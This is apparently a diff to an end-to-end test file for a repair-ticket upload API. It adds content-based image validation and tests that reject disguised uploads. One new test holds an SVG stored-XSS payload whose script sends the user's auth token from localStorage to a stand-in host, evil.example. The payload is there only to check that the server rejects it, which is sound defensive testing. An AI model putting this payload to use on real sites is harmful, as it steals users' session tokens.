@@ -7,7 +7,15 @@ import { AppModule } from './../src/app.module';
 import { AuthService } from './../src/auth/auth.service';
 import { PrismaService } from './../src/prisma/prisma.service';
 import { NotificationsService } from './../src/notifications/notifications.service';
+import { serveUploads } from './../src/uploads/serve-uploads';
 import { Role } from '@prisma/client';
+
+// Minimal valid 1x1 PNG (real magic bytes) — required now that uploads are
+// validated by content, not by client-declared mimetype or filename.
+const PNG_BYTES = Buffer.from(
+  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=',
+  'base64',
+);
 
 interface RepairTicketResponse {
   id: string;
@@ -62,9 +70,7 @@ describe('Repairs (e2e)', () => {
       .compile();
 
     app = moduleFixture.createNestApplication<NestExpressApplication>();
-    app.useStaticAssets(join(process.cwd(), 'uploads'), {
-      prefix: '/uploads',
-    });
+    serveUploads(app);
     authService = moduleFixture.get(AuthService);
     prisma = moduleFixture.get(PrismaService);
     await app.init();
@@ -132,7 +138,7 @@ describe('Repairs (e2e)', () => {
       .field('description', '咖啡機漏水')
       .field('userClass', '資訊三甲')
       .field('userPhone', '0912-345-678')
-      .attach('photo', Buffer.from('fake-image-bytes'), 'issue.png')
+      .attach('photo', PNG_BYTES, 'issue.png')
       .expect(201);
 
     const body = res.body as RepairTicketResponse;
@@ -142,7 +148,39 @@ describe('Repairs (e2e)', () => {
     const photoRes = await request(app.getHttpServer())
       .get(body.imageUrl as string)
       .expect(200);
-    expect(photoRes.body).toEqual(Buffer.from('fake-image-bytes'));
+    expect(photoRes.body).toEqual(PNG_BYTES);
+    expect(photoRes.headers['x-content-type-options']).toBe('nosniff');
+  });
+
+  it('rejects an SVG upload masquerading as a photo (stored XSS vector)', () => {
+    const svgPayload = Buffer.from(
+      '<svg xmlns="http://www.w3.org/2000/svg"><script>fetch(\'https://evil.example/collect?t=\'+localStorage.getItem(\'meetfix_token\'))</script></svg>',
+    );
+    return request(app.getHttpServer())
+      .post('/repairs')
+      .set('Authorization', `Bearer ${userToken}`)
+      .field('location', '一樓大廳')
+      .field('category', '桌椅家具')
+      .field('description', '惡意上傳測試')
+      .attach('photo', svgPayload, {
+        filename: 'x.svg',
+        contentType: 'image/svg+xml',
+      })
+      .expect(400);
+  });
+
+  it('rejects a photo upload whose content is not a real image, regardless of declared filename/mimetype', () => {
+    return request(app.getHttpServer())
+      .post('/repairs')
+      .set('Authorization', `Bearer ${userToken}`)
+      .field('location', '一樓大廳')
+      .field('category', '桌椅家具')
+      .field('description', '惡意上傳測試')
+      .attach('photo', Buffer.from('not-a-real-image'), {
+        filename: 'issue.png',
+        contentType: 'image/png',
+      })
+      .expect(400);
   });
 
   it('rejects submission missing required fields', () => {
